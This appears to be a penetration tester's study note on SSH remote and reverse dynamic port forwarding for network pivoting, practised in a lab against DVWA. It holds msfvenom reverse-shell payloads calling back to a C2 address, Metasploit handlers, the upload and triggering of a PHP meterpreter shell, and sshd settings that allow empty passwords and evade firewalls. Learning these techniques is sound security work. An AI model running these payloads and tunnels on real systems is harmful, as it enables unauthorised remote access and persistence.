# Remote Port Forwarding

## 01 - Configuration Conditions

In the `/etc/ssh/sshd_config`. `GatewayPorts` must be enabled. Below you'll see the configuration.

```
userware@hackware-os:~$ cat /etc/ssh/sshd_config
..[omitted]..
GatewayPorts yes
..[omitted]..
```

## 02 - Usage

### 2.1 - Victim port forwarding to the attacker's SSH server

```
$ ssh -R [<bind_IP>:]<local_PORT>:<bind_remote_IP>:<bind_remote_PORT> <username>@<attacker_IP>

$ ssh -NTfCqR [<bind_IP>:]<local_PORT>:<bind_remote_IP>:<bind_remote_PORT> <username>@<attacker_IP>
```

### 2.2 - Remote Port Forwarding Reverse Shells

```
$ ssh -NTfCqR <local_PORT>:127.0.0.1:<bind_remote_PORT> <username>@<C2_IP>
```

Generate a reverse callback shell and start a shell handler via `netcat`.

```
$ msfvenom -p linux/x86/shell/reverse_tcp lhost=<C2_IP> lport=<local_PORT> -f elf -o shell.elf

$ nc -lnvp <bind_remote_PORT>
```

Generate a reverse callback shell and start a shell handler via `metasploit-framework`.

```
$ msfvenom -p linux/x86/meterpreter/reverse_tcp lhost=<C2_IP> lport=<local_PORT> -f elf -o shell.elf

msf > use payload/linux/x86/meterpreter/reverse_tcp

msf payload(linux/x86/meterpreter/reverse_tcp) > set lhost <C2_IP>

msf payload(linux/x86/meterpreter/reverse_tcp) > set lport <bind_remote_PORT>

msf payload(linux/x86/meterpreter/reverse_tcp) > to_handler
```

## 03 - Scenarios

### 3.1 - Reverse SSH Tunneling

TODO: Make a network topology diagram to illustrate the pivoting scenario and redo the lab

```
userware@hackware-os:~$ ssh fox@10.0.2.15

fox@ubuntulinux:~$ ssh -NTfCqR 8888:192.168.56.106:80 -o "UserKnownHostsFile=/dev/null StrictHostKeyChecking=no" user@10.0.2.4
```

![[01 - Reverse Port Forwarding.png]]

```
fox@ubuntulinux:~$ ss -antp
State          Recv-Q         Send-Q                 Local Address:Port                    Peer Address:Port          Process
LISTEN         0              128                          0.0.0.0:22                           0.0.0.0:*
LISTEN         0              128                          0.0.0.0:8888                         0.0.0.0:*
ESTAB          0              0                           10.0.2.4:42586                      10.0.2.15:22             users:(("ssh",pid=5282,fd=3))
ESTAB          0              0                           10.0.2.4:22                         10.0.2.15:44498
LISTEN         0              128                             [::]:22                              [::]:*
LISTEN         0              128                             [::]:8888                            [::]:*
```

Grab the port using [[03 - Local Port Forwarding|local port forwarding]] method. Then navigate through the web browser.

```
userware@hackware-os:~$ ssh -L 8888:127.0.0.1:8888 fox@10.0.2.15
```

### 3.2 - Reverse SSH Tunnel via Reverse Callback Shell

TODO: Make a network topology diagram to illustrate the pivoting scenario and redo the lab

```
userware@hackware-os:~$ ssh fox@10.0.2.15 -NTfCqD 1080 -R 192.168.56.111:4455:127.0.0.1:4445
```

![[01 - Reverse Shell Tunnel.png]]

```
userware@hackware-os:~$ msfvenom -p php/meterpreter/reverse_tcp lhost=192.168.56.111 lport=4455 -f raw -o rsh.php
```

Launch a shell handler in metasploit for incoming sessions.

TODO: Repeat the steps

```
msf6 > use exploit/mutli/handler
[*] Using configured payload php/meterpreter/reverse_tcp
msf6 > exploit(multi/handler) > set payload php/meterpreter/reverse_tcp
payload => php/meterpreter/reverse_tcp
msf6 > exploit(multi/handler) > set lhost 192.168.56.111
lhost => 192.168.56.111
msf6 > exploit(multi/handler) > set lport 4445
lport => 4445
msf6 > exploit(multi/handler) > set disablepayloadhandler true
disablepayloadhandler => true
msf6 > exploit(multi/handler) > exploit -j
[*] Exploit running as background job 1.
[*] Exploit completed, but no session was created.

[-] Handler failed to bind to 192.168.56.111:4445:-  -
[*] Started reverse TCP handler on 0.0.0.0:4445
```

Upload the reverse shell.

![[02 - PHP File Upload.png]]

Edit the Proxychains configuration.

```
userware@hackware-os:~$ cat /etc/proxychains4.conf
..[omitted]..
socks5  127.0.0.1 1080
```

Then execute the reverse shell.

```
userware@hackware-os:~$ proxychains curl -X GET http://192.168.56.106/dvwa/hackable/uploads/rsh.php
[proxychains] config file found: /etc/proxychains4.conf
[proxychains] preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4
[proxychains] DLL init: proxychains-ng 4.16
[proxychains] Strict chain  ...  127.0.0.1:1080  ...  192.168.56.106:80  ...  OK

userware@hackware-os:~$ curl --socks5 127.0.0.1:1080 -X GET http://192.168.56.106/dvwa/hackable/uploads/rsh.php
```

We have established a meterpreter reverse shell.

![[03 - MSF Reverse Callback Shell.png]]

### 3.3 - Reverse Dynamic Port Forwarding

#### 3.3.1 - Conditions

The OpenSSH client must have a version 7.6 or above to use the feature. Otherwise, you'll stick with reverse tunneling techniques.

```
$ ssh -V
```

Create a local that is specifically used for reverse SSH tunneling.

```
$ sudo useradd -m <ssh_user> -s /bin/bash
```

#### 3.3.2 - Generate SSH Key Locally

Create a temp directory.

```
$ mkdir /tmp/keys/
```

Generate an SSH key inside a temporary directory without any passphrase in a compromised system.

```
$ ssh-keygen -qt rsa -b 4096 -f /tmp/keys/id_rsa -C '' -N ''

$ ls /tmp/keys/
id_rsa  id_rsa.pub
```

Copy the SSH key while in the non-interactive shell.

```
$ cat /tmp/keys/id_rsa.pub
```

Paste it in the `authorized_keys` and include restrictions to circumvent security risks. Here's what should we configure:

- The `from=<IP>` should be included with the compromised machine's NAT IP address (must be numeric).
- Nullify all of the commands that is restrictively used for port forwarding with the `command="echo 'Only for port forwarding'`.
- No agent forwarding (`no-agent-forwarding`).
- No X11 forwarding (`no-x11-forwarding`) means no need to interact with GUI applications.
- No PTY allocation (`no-pty`).
- Replace `<ssh_public_key_contents>` from a copied SSH public key.

```
userware@hackware-os:~$ touch ~/.ssh/authorized_keys

userware@hackware-os:~$ cat ~/.ssh/authorized_keys
from="<compromised_system_IP>",command="echo 'Only for port forwarding'",no-agent-forwarding,no-X11-forwarding,no-pty, <ssh_public_key_contents>

userware@hackware-os:~$ chmod 600 ~/.ssh/authorized_keys
```

Authenticate to the SSH server (the attacker).

```
$ ssh -i /tmp/keys/id_rsa -NTfCqR [127.0.0.1]:<SOCKS_Proxy> -o "UserKnownHostsFile=/dev/null StrictHostKeyChecking=no" <username>@<attacker_IP>
```

Confirm the compromised machine has established connection via SSH with a reverse dynamic port forwarding.

```
userware@hackware-os:~$ ss -antpl
```

#### 3.3.3 - Create SSH user without authentication

TODO: Test this

Configure the `/etc/ssh/sshd_config` to permit without password and key to authenticate. Here are the following steps:

- Modify the port to bypass firewall restrictions. Use any of the common ports such as, a web server (80, 443, 8000, 8080, or 8443) that most users used to interact through the web browser.
- Restrict a specific user that will be used to authenticate the SSH server.
- Disable the use of `sftp` (just comment it out) only `scp` is accepted just to download from the current directory.
- Disable authentication to make it easier to execute and write data from an allowed specific location.
- When tunneling the SSH tunnel only `-L` and `-D` flags are disabled to the current user. Only `-R` is permitted to port forward in this context.

Include a wrapper script with restricted commands that are permitted.

```
userware@hackware-os:~$ cat > /home/<ssh_user>/restricted_shell.sh << EOF
#!/bin/sh
 
case "$SSH_ORIGINAL_COMMAND" in
    "cat")
        cat $@
        ;;
    *)
        exit 1
        ;;
esac
EOF

$ chmod 755 /home/<ssh_user>/restricted_shell.sh
```


```
# cat /etc/ssh/sshd_config
Port <PORT>
..[omitted]..
PasswordAuthentication yes
PermitEmptyPasswords yes
..[omitted]..
GatewayPorts Yes
..[omitted]..
ClientAliveInterval 120
Match User <ssh_user>
    ForceCommand /home/%u/restricted_shell.sh
    PermitOpen none
    PermitListen localhost:*
```

Remove password.

```
# printf '%s\n' '<ssh_user>:U6aMy0wojraho' | chpasswd -e

# passwd -d <ssh_user>
```

You should have a status of **NP (No Password)**.

```
# passwd -S <ssh_user>
```

Restart the SSH server.

```
# systemctl restart sshd
```

```

```

Confirm the compromised machine has established connection via SSH with a reverse dynamic port forwarding.

```
$ ss -antlp
```

---
## References

- [LinuxHint: SSH StrickHostKeyChecking](https://linuxhint.com/ssh-stricthostkeychecking/)

- [SkyDogCon 2017: "SSH+MSF+TOR = Anonymous Remote Shells" by Catatonic Prime](https://www.youtube.com/watch?v=RvZ9-hD-KZw)

- [PayloadsAllTheThings: Network Pivoting Techniques](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Network%20Pivoting%20Techniques.md)

- [FareedFauzi OSCP Playbook: Port Forwarding SSH Tunneling](https://fareedfauzi.gitbook.io/oscp-notes/others/port-forwarding-ssh-tunneling)

- [RawSec: Overview of Network Pivoting and Tunneling](https://blog.raw.pm/en/state-of-the-art-of-network-pivoting-in-2019/)

- [SHANER.LIFE: The Little known SSH ForceCommand](https://shaner.life/the-little-known-ssh-forcecommand/)

### Certcube

- [Certcube: Pivoting and SSH Port Forwarding Basics](https://blog.certcube.com/pivoting-and-ssh-port-forwarding-basics/)

- [Certcube: Pivoting Port Forwarding](https://blog.certcube.com/pivoting-port-forwarding/)

### RedSiege

- [RedSiege: SSHishing – Abusing Shortcut Files and the Windows SSH Client for Initial Access](https://redsiege.com/blog/2024/04/sshishing-abusing-shortcut-files-and-the-windows-ssh-client-for-initial-access/)

### Scenarios

- [Bryan Leong (NobodyAtall): Network Pivoting Using SSH Return Reverse Shell From Internal Network Machine](https://bryanleong98.medium.com/network-pivoting-using-ssh-return-reverse-shell-from-internal-network-machine-f1c5043b2d86)

- [Anestis Bechtsoudis: Using SSH Socks Proxies with MSF Reverse TCP Payloads](https://bechtsoudis.com/archive/2012/06/08/using-ssh-socks-proxies-with-msf-reverse-tcp-payloads/index.html)

- [SlayerLabs: Tunneling Quick Guide](https://posts.slayerlabs.com/tunneling-quick-guide/)